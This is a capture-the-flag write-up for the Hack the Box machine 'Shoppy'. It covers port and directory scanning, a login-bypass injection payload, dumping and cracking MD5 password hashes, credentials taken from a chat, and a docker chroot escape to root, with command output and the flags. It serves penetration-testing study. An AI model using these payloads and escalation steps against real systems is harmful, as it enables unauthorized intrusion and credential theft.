# Shoppy - Hack the Box

## Run an nmap scan

> nmap -sC -sV -Pn 10.10.11.180

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-10 18:41 EST
Nmap scan report for 10.10.11.180
Host is up (0.075s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds
```

Going to the <IP>:80 in the browser shows that there should be a DNS entry in the hosts files for shoppy.htb

After we edit the host file, we can load the webpage

Let's also run a gobuster to find directories

## Gobuster

> gobuster dir -u http://shoppy.htb -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/10 19:20:50 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1074]
/images               (Status: 301) [Size: 179] [--> /images/]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/Login                (Status: 200) [Size: 1074]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/Admin                (Status: 302) [Size: 28] [--> /login]
/exports              (Status: 301) [Size: 181] [--> /exports/]
```

Navigating to http://shoppy.htb/login gives us a login page

We can do a SQL injection to bypass the login by putting:
> admin’ || ‘1==1
as the username.

Then if we search for users, and search for the same SQL injection `admin’ || ‘1==1` it takes us to a page we can download an export from.
If you download the export it gives you a JSON page with this info:

```	
0	
_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
1	
_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"
```

### John the Ripper to crack the hashes

> john --format=raw-md5 joshhash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
remembermethisway (?)
1g 0:00:00:00 DONE (2022-11-10 19:41) 4.545g/s 3690Kp/s 3690Kc/s 3690KC/s renato1989..remaster
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

We can't SSH in with that account, so we have to find something different.

## Enumerate subdirectories to find potential hidden content

> gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb

mattermost.shoppy.htb

Set that to the same IP in hosts file

Navigate to that subdomain in a browser, login with josh username and password, and find a chat with deploy instructions for a user account:

username: jaeger
password: Sh0ppyBest@pp!

#### USER FLAG: 5ef787c8666af5e245fe321df6a7fa5a

## Find out what user has sudo access to

> sudo -l

```console
Matching Defaults entries for jaeger on shoppy:                              
    env_reset, mail_badpass,                                                 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                         
                                                                             
User jaeger may run the following commands on shoppy:                        
    (deploy) /home/deploy/password-manager
```

### Run the password manager as the deploy user

> sudo -u deploy /home/deploy/password-manager

### Run the GTFOBins docker binary

> docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Grab the root flag

#### ROOT FLAG: 73fbe90be94c930fdbadac562239e0da